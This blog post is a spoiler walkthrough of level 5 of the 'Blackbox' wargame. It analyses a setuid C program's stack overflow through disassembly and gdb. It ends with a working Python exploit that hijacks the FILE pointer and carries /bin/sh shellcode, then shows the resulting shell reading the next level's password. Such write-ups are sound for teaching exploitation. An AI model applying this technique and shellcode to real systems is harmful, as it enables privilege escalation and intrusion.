---
layout: post
title:  "Blackbox"
subtitle: "Level 5"
date:   2012-01-25
categories: reverse-engineering
---

__As in the previous posts, the password for the next level has been replaced with question marks so as to not make this too obvious, and so that the point of the walkthrough, which is mainly educational, will not be missed.__

Also, make sure you notice this SPOILER ALERT! If you want to try and solve the level by yourself then read no further!

Hello again. Make sure you are comfortable, because this is going to be a somewhat long level, and rather more difficult that what we saw so far.

First order of business, `login` & `ls`:

```
$ ssh -p 2225 level5@blackbox.smashthestack.org
level5@blackbox.smashthestack.org's password:
...
level5@blackbox:~$ ls -l
total 560
-rwsr-xr-x 1 level6 level6 557846 2008-01-12 21:17 list
-rw-r--r-- 1 root   level5    475 2007-12-29 14:10 list.c
-rw-r--r-- 1 root   level5     10 2007-12-29 14:10 password
```

And now we take a look at the source file:

```c
#include <stdio.h>


int main(int argc, char **argv)
{
    char buf[100];
    size_t len;
    char fixedbuf[10240];
    FILE *fh;
    char *ptr = fixedbuf;
    int i;

    fh = fopen("somefile", "r");
    if(!fh)
        return 0;

    while((len = fread(buf, 1, 100, fh)) > 0) {
        for(i = 0; i < len; i++) {
            // Disable output modifiers
            switch(buf[i]) {
            case 0xFF:
            case 0x00:
            case 0x01:
                break;
            default:
                *ptr = buf[i];
                ptr++;
            }
        }
    }
    printf("%s", fixedbuf);

    fclose(fh);
}
```

The program seems to open some fixed file from the current path (which means that we will have to generate that `"somefile"` file under `/tmp`), it then proceeds to read chunks of 100 bytes from the file into some temporary buffer, which are copied to a bigger buffer while filtering-out specific byte values.

The contents of the big buffer are then printed out to us.

Well, our attack surface is obviously the file `filename`. We can also notice that if `filename` is indeed longer than 10240 bytes, the read-chunk-and-copy loop will happily continue its business, whereby it will probably mess up the stack.

So lets try and see what the stack frame looks like. And the way to do that is to look at the diassembly of `main`:

```
level5@blackbox:~$ objdump -d list|grep -A65 "<main>:"
08048208 <main>:
 8048208: 8d 4c 24 04           lea    0x4(%esp),%ecx
 804820c: 83 e4 f0              and    $0xfffffff0,%esp
 804820f: ff 71 fc              pushl  0xfffffffc(%ecx)
 8048212: 55                    push   %ebp
 8048213: 89 e5                 mov    %esp,%ebp
 8048215: 51                    push   %ecx
 8048216: 81 ec 94 28 00 00     sub    $0x2894,%esp
 804821c: 8d 85 88 d7 ff ff     lea    0xffffd788(%ebp),%eax
 8048222: 89 45 f4              mov    %eax,0xfffffff4(%ebp)
 8048225: c7 44 24 04 88 32 0a  movl   $0x80a3288,0x4(%esp)
 804822c: 08 
 804822d: c7 04 24 8a 32 0a 08  movl   $0x80a328a,(%esp)
 8048234: e8 57 af 00 00        call   8053190 <_IO_new_fopen>
 8048239: 89 45 f0              mov    %eax,0xfffffff0(%ebp)
 804823c: 83 7d f0 00           cmpl   $0x0,0xfffffff0(%ebp)
 8048240: 75 43                 jne    8048285 <main+0x7d>
 8048242: c7 85 78 d7 ff ff 00  movl   $0x0,0xffffd778(%ebp)
 8048249: 00 00 00 
 804824c: e9 8f 00 00 00        jmp    80482e0 <main+0xd8>
 8048251: c7 45 f8 00 00 00 00  movl   $0x0,0xfffffff8(%ebp)
 8048258: eb 23                 jmp    804827d <main+0x75>
 804825a: 8b 45 f8              mov    0xfffffff8(%ebp),%eax
 804825d: 0f b6 44 05 88        movzbl 0xffffff88(%ebp,%eax,1),%eax
 8048262: fe c0                 inc    %al
 8048264: 3c 02                 cmp    $0x2,%al
 8048266: 77 02                 ja     804826a <main+0x62>
 8048268: eb 10                 jmp    804827a <main+0x72>
 804826a: 8b 45 f8              mov    0xfffffff8(%ebp),%eax
 804826d: 0f b6 54 05 88        movzbl 0xffffff88(%ebp,%eax,1),%edx
 8048272: 8b 45 f4              mov    0xfffffff4(%ebp),%eax
 8048275: 88 10                 mov    %dl,(%eax)
 8048277: ff 45 f4              incl   0xfffffff4(%ebp)
 804827a: ff 45 f8              incl   0xfffffff8(%ebp)
 804827d: 8b 45 f8              mov    0xfffffff8(%ebp),%eax
 8048280: 3b 45 ec              cmp    0xffffffec(%ebp),%eax
 8048283: 72 d5                 jb     804825a <main+0x52>
 8048285: 8b 45 f0              mov    0xfffffff0(%ebp),%eax
 8048288: 89 44 24 0c           mov    %eax,0xc(%esp)
 804828c: c7 44 24 08 64 00 00  movl   $0x64,0x8(%esp)
 8048293: 00 
 8048294: c7 44 24 04 01 00 00  movl   $0x1,0x4(%esp)
 804829b: 00 
 804829c: 8d 45 88              lea    0xffffff88(%ebp),%eax
 804829f: 89 04 24              mov    %eax,(%esp)
 80482a2: e8 09 b0 00 00        call   80532b0 <_IO_fread>
 80482a7: 89 45 ec              mov    %eax,0xffffffec(%ebp)
 80482aa: 83 7d ec 00           cmpl   $0x0,0xffffffec(%ebp)
 80482ae: 0f 95 c0              setne  %al
 80482b1: 84 c0                 test   %al,%al
 80482b3: 75 9c                 jne    8048251 <main+0x49>
 80482b5: 8d 85 88 d7 ff ff     lea    0xffffd788(%ebp),%eax
 80482bb: 89 44 24 04           mov    %eax,0x4(%esp)
 80482bf: c7 04 24 93 32 0a 08  movl   $0x80a3293,(%esp)
 80482c6: e8 e5 ab 00 00        call   8052eb0 <_IO_printf>
 80482cb: 8b 45 f0              mov    0xfffffff0(%ebp),%eax
 80482ce: 89 04 24              mov    %eax,(%esp)
 80482d1: e8 0a ac 00 00        call   8052ee0 <_IO_new_fclose>
 80482d6: c7 85 78 d7 ff ff 00  movl   $0x0,0xffffd778(%ebp)
 80482dd: 00 00 00 
 80482e0: 8b 85 78 d7 ff ff     mov    0xffffd778(%ebp),%eax
 80482e6: 81 c4 94 28 00 00     add    $0x2894,%esp
 80482ec: 59                    pop    %ecx
 80482ed: 5d                    pop    %ebp
 80482ee: 8d 61 fc              lea    0xfffffffc(%ecx),%esp
 80482f1: c3                    ret
```

Wow, good thing the executable has symbol information, because the way to identify the position of the local variables in the stack is by tracking library function calls.

Lets start with these two lines though:

```
 804821c: 8d 85 88 d7 ff ff     lea    0xffffd788(%ebp),%eax
 8048222: 89 45 f4              mov    %eax,0xfffffff4(%ebp)
```

This looks like an address assignment, we have such a line in the C program:

```c
char *ptr = fixedbuf;
```

This means that `fixedbuf` starts at `ebp-0x2878`, and `ptr` is stored at `ebp-0xc`.

Next we have a call to `_IO_new_fopen`:

```
 8048225: c7 44 24 04 88 32 0a  movl   $0x80a3288,0x4(%esp)
 804822c: 08 
 804822d: c7 04 24 8a 32 0a 08  movl   $0x80a328a,(%esp)
 8048234: e8 57 af 00 00        call   8053190 <_IO_new_fopen>
 8048239: 89 45 f0              mov    %eax,0xfffffff0(%ebp)
```

And the output, which is a file pointer, is stored at `ebp-0x10`, which must be our `fp`.

Now let's look at the call to `_IO_fread`:

```
 8048285: 8b 45 f0              mov    0xfffffff0(%ebp),%eax
 8048288: 89 44 24 0c           mov    %eax,0xc(%esp)
 804828c: c7 44 24 08 64 00 00  movl   $0x64,0x8(%esp)
 8048293: 00 
 8048294: c7 44 24 04 01 00 00  movl   $0x1,0x4(%esp)
 804829b: 00 
 804829c: 8d 45 88              lea    0xffffff88(%ebp),%eax
 804829f: 89 04 24              mov    %eax,(%esp)
 80482a2: e8 09 b0 00 00        call   80532b0 <_IO_fread>
 80482a7: 89 45 ec              mov    %eax,0xffffffec(%ebp)
```

The first parameter is at the bottom of the stack (at `esp`), this should be the address of `buf`, and we can see it is `ebp-0x78`.

The rest of the parameters are already known to us so I won't stall on them.

What's left in this function call is the return value, which is stored at `ebp-0x14` and is our `len`.

The last local variable is `i`, we can recognize it as the address that gets loaded with a 0, as we can see in the for loop initialization.

There are actually two such instances. This is the first one:

```
 8048242: c7 85 78 d7 ff ff 00  movl   $0x0,0xffffd778(%ebp)
```

Which is the return value of `main`, as we can see `eax` is reloaded from that address right before exiting `main`:

```
 80482e0: 8b 85 78 d7 ff ff     mov    0xffffd778(%ebp),%eax
 80482e6: 81 c4 94 28 00 00     add    $0x2894,%esp
 80482ec: 59                    pop    %ecx
 80482ed: 5d                    pop    %ebp
 80482ee: 8d 61 fc              lea    0xfffffffc(%ecx),%esp
 80482f1: c3                    ret
```

The second one is the one that interests us:

```
 8048251: c7 45 f8 00 00 00 00  movl   $0x0,0xfffffff8(%ebp)
```

Which means `i` is stored at `ebp-0x8`.

Let's summarize it all up in one diagram:

![Stack-frame of "main"](/assets/blackbox/5/stack-frame.png){: .center-image }

Imagine now the following scenario: We have a very big file, and the read-chunk-and-copy loop keeps copying the data from `buf` into `fixedbuf`. After 102 of these cycles, `ptr` is pointing to `fixedbuf+10200`, or, `buf-40`. After the next cycle, `ptr` will point to `buf+60`. This means, that on the next `read` (104'th if my tally has been kept correctly) `ptr` will end up pointing beyond the stack frame.

Not entirely though. The thing is, that the copying is not done in one atomic operation, rather, `buf` is copied to `ptr` byte-by-byte, which means that 40 bytes into the 104'th cycle, the value of `len` will change. This affects the flow control of the for-loop, because if we make `len` smaller than `i` is in that round, the loop will stop.

Since x86 is a little-endian machine, the first byte of `len` that will be overwritten is the LSB, so we need to overwrite it so that the loop continues, anything larger than 101 will do.

Now, remember that not all byte values are allowed, and if we want to reach interesting places in the stack, we are forced to write the rest of `len`. This means that the smallest value we can write is `0x02`, and this will make `len` look something like `0x020202??` when we are done with it.

Next we override `fp`, again, we can't help but to overwrite it. Let's leave the discussion about it for later though.

After that comes `ptr`, and this is where it gets tricky, we are overwriting the pointer, using itself as a pointer to its individual bytes. whichever way it goes, once we overwrite the LSB, the pointer will not point to itself anymore, so we need to decide were we want it to point. Well, how about skipping over the rest of `ptr`, and continue at the MSB of `i`.

Why would we want to do that? well, remember we put something like `0x020202??` in `len`? then if we set the MSB of `i` to `0x03`, then `i` will look like `0x03??????` which is bigger than `len`! so after that the loop will stop.

Why do we want it to stop now? Well, you see, when the loop on `i` stops, there will be another call to `fread`, only now, `fp` is different.

What would happen? Well, let's take a look at that `_IO_fread` (cropped in favor of readability):

```
080532b0 <_IO_fread>:
 80532b0: 55                    push   %ebp
 80532b1: 89 e5                 mov    %esp,%ebp
 80532b3: 83 ec 2c              sub    $0x2c,%esp
 80532b6: 89 75 f8              mov    %esi,0xfffffff8(%ebp)
 80532b9: 8b 75 0c              mov    0xc(%ebp),%esi
 80532bc: 89 7d fc              mov    %edi,0xfffffffc(%ebp)
 80532bf: 8b 7d 10              mov    0x10(%ebp),%edi
 80532c2: 89 5d f4              mov    %ebx,0xfffffff4(%ebp)
 80532c5: 0f af f7              imul   %edi,%esi
 80532c8: 85 f6                 test   %esi,%esi
 80532ca: 0f 84 a4 00 00 00     je     8053374 <_IO_fread+0xc4>
 80532d0: 8b 55 14              mov    0x14(%ebp),%edx
 80532d3: c7 45 e0 00 00 00 00  movl   $0x0,0xffffffe0(%ebp)
 80532da: 8b 02                 mov    (%edx),%eax
 80532dc: 25 00 80 00 00        and    $0x8000,%eax
 80532e1: 66 85 c0              test   %ax,%ax
 80532e4: 75 1f                 jne    8053305 <_IO_fread+0x55>
 80532e6: b8 00 00 00 00        mov    $0x0,%eax
 80532eb: 85 c0                 test   %eax,%eax
 80532ed: c7 45 e0 00 00 00 00  movl   $0x0,0xffffffe0(%ebp)
 80532f4: 0f 85 7e 00 00 00     jne    8053378 <_IO_fread+0xc8>
 80532fa: 8b 45 14              mov    0x14(%ebp),%eax
 80532fd: 89 04 24              mov    %eax,(%esp)
 8053300: e8 bb 40 02 00        call   80773c0 <_IO_flockfile>
 8053305: 8b 55 14              mov    0x14(%ebp),%edx
 8053308: 8b 45 08              mov    0x8(%ebp),%eax
 805330b: 89 74 24 08           mov    %esi,0x8(%esp)
 805330f: 89 14 24              mov    %edx,(%esp)
 8053312: 89 44 24 04           mov    %eax,0x4(%esp)
 8053316: e8 b5 38 00 00        call   8056bd0 <_IO_sgetn>
 805331b: 8b 55 14              mov    0x14(%ebp),%edx
 805331e: 89 c3                 mov    %eax,%ebx
 8053320: 8b 02                 mov    (%edx),%eax
 8053322: 25 00 80 00 00        and    $0x8000,%eax
 8053327: 66 85 c0              test   %ax,%ax
 805332a: 74 37                 je     8053363 <_IO_fread+0xb3>
...
```

First, let's remember what are the parameters to `_IO_fread`, in what order are they in the stack, and where can we see them in the disassembly.

Well, the parameters were (at the bottom) `buf`, then the chunk `length` (=1), then the number of chunks (100) and finally `fp`.

This means that inside `_IO_fread`, we can find `fp` at `ebp+0x14`. Let's see what does the function do with it:

```
 80532d0: 8b 55 14              mov    0x14(%ebp),%edx
 80532d3: c7 45 e0 00 00 00 00  movl   $0x0,0xffffffe0(%ebp)
 80532da: 8b 02                 mov    (%edx),%eax
 80532dc: 25 00 80 00 00        and    $0x8000,%eax
 80532e1: 66 85 c0              test   %ax,%ax
 80532e4: 75 1f                 jne    8053305 <_IO_fread+0x55>
```

The long-word to which `fp` points is copied into `eax`, after which it is masked with `0x8000`, and if that bit is set, it jumps to `0x08053305`:

```
 8053305: 8b 55 14              mov    0x14(%ebp),%edx
 8053308: 8b 45 08              mov    0x8(%ebp),%eax
 805330b: 89 74 24 08           mov    %esi,0x8(%esp)
 805330f: 89 14 24              mov    %edx,(%esp)
 8053312: 89 44 24 04           mov    %eax,0x4(%esp)
 8053316: e8 b5 38 00 00        call   8056bd0 <_IO_sgetn>
```

This is a call to `_IO_sgetn` with `fp` as the first parameter.

Fine, let's see what `_IO_sgetn` does:

```
08056bd0 <_IO_sgetn>:
 8056bd0: 55                    push   %ebp
 8056bd1: 89 e5                 mov    %esp,%ebp
 8056bd3: 8b 55 08              mov    0x8(%ebp),%edx
 8056bd6: 5d                    pop    %ebp
 8056bd7: 8b 8a 94 00 00 00     mov    0x94(%edx),%ecx
 8056bdd: 8b 49 20              mov    0x20(%ecx),%ecx
 8056be0: ff e1                 jmp    *%ecx
 8056be2: 8d b4 26 00 00 00 00  lea    0x0(%esi),%esi
 8056be9: 8d bc 27 00 00 00 00  lea    0x0(%edi),%edi
```

In the context of `_IO_sgetn`, `fp` is located at `ebp+0x8`.

Well, there's some pointer magic that's happening here, after which there a jump to a location stored in `ecx`.

let's try to write it a more readable C notation:

```c
edx = fp;
ecx = *(unsigned long *)(edx + 0x94);
ecx = *(unsigned long *)(ecx + 0x20);
```

It looks like `fp` actually points to some structure, which contains pointers to other structures, which contain an address of a handler.

Well, if we can make the program jump to our handler, we can make it execute a shell.

OK then, let's look back and review what we know, and decide on a strategy.

First, we have found a way to override `fp`, and then stop the loop and make `fread` run again.

Then we saw that in `fread`, some address is extracted from `fp`, and then the program jumps to that address.

I propose then the following strategy:
. We override `fp` with the address of the bottom of `fixedbuf`.
. We prepare the first long word at the bottom of `fixedbuf` to be something like `0x????80??`, so as to steer the execution path in our direction.
. `0x94` bytes after the beginning of `fixedbuf`, we prepare a pointer to another place in `fixedbuf`. let's call it `ptr1`.
. `0x20` bytes after `ptr1`, we will prepare another address which will be the address of our shellcode.

It should be much easier to understand this in a diagram:

![File structure](/assets/blackbox/5/file.png){: .center-image }

This is the structure we need to have in the beginning of our file.

Assuming we know `ebp`, the end of the file (meaning, starting from the point in which we overwrite `len`) should look like this:
. First `0x70`, just to make sure we keep the for-loop alive.
. Then `0x020202` because we have to
. Then we overwrite `fp` with `fixedbuf=ebp-0x2878`
. Then we overwrite the LSB of `ptr` with the address of the second to MSB of `i`. That is because after we overwrite the LSB of `ptr`, it will get incremented in the next line of code, this would make `ptr` point to the LSB of `i`.
. And then we overwrite the MSB of `i` with `0x03` which will cause the loop to stop, and let the bottom of the file do its magic.
. Between the beginning and the end, we need to fill the space with something.

The only open question left is - what is `ebp`?

Let's take a look:

```
level5@blackbox:~$ gdb list
...
(gdb) break main
Breakpoint 1 at 0x8048216
(gdb) run
Starting program: /home/level5/list 

Breakpoint 1, 0x08048216 in main ()
(gdb) p $ebp
$1 = (void *) 0xbfffd8f8
```

Well, this means that we need to override `fp` with `ebp-0x2878=0xbfffb080`.

This is not good, because in `0xbfffb0a0` we have `0xff` which we can not write.

This pretty much closes the lid on everything we were planning so far, because the basic premise of the entire strategy is that we can redirect `fp` to our own file structure.
However, we should not abandon all hope, because we have the power to make the stack begin much lower by simply feeding some very long argument to the program. Let's see how this works:

```
(gdb) run `python -c "print 'a'*0x100"`
Starting program: /home/level5/list `python -c "print 'a'*0x100"`

Breakpoint 1, 0x08048216 in main ()
(gdb) p $ebp
$1 = (void *) 0xbfffd7f8
```

This address is lower by `0x100` bytes than `ebp` when running without parameters. Let's try again now with an even larger number:

```
(gdb) run `python -c "print 'a'*0x10000"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level5/list `python -c "print 'a'*0x10000"`

Breakpoint 1, 0x08048216 in main ()
(gdb) p $ebp
$2 = (void *) 0xbffed8f8
```

Bingo! that is our `ebp` for reasons I'll go into in a pending article. Suffice to say that when running list inside gdb we have `argv[0]=/home/level5/list` (as I highlighted above) , and when running from `/tmp` we have `argv[0]=/home/level5/list`, which are the same.

Well, now that we have all our constants and strategies settled down, we can generate the input file. I like using scripts:

```python
import struct
EBP = 0xbffed8f8
FIXEDBUF = EBP - 0x2878
I = EBP - 0x8
PTR1 = FIXEDBUF + 0x98
PTR2 = FIXEDBUF + 0xbc
SHELLCODE = "31c050682f2f7368682f62696e89e3505389e131d2b00bcd80".decode("hex")

FILE = ""
FILE += struct.pack("<L", 0x08080808)
FILE += '\x90' * 0x90
FILE += struct.pack("<L", PTR1)
FILE += '\x90' * 0x20
FILE += struct.pack("<L", PTR2)
FILE += SHELLCODE
FILE += '\x90' * (10340 - len(FILE))
FILE += struct.pack("<L", 0x02020270)
FILE += struct.pack("<L", FIXEDBUF)
FILE += struct.pack("<L", I + 2)[0]
FILE += '\x03'

f = open('somefile', 'wb')
f.write(FILE)
f.close()
```

Let's give it a shot:

```
level5@blackbox:/tmp$ python genfile.py
level5@blackbox:/tmp$ ~/list `python -c "print 'a'*0x10000"`
sh-3.1$ cat /home/level6/password
???????????????
```

And we're done!
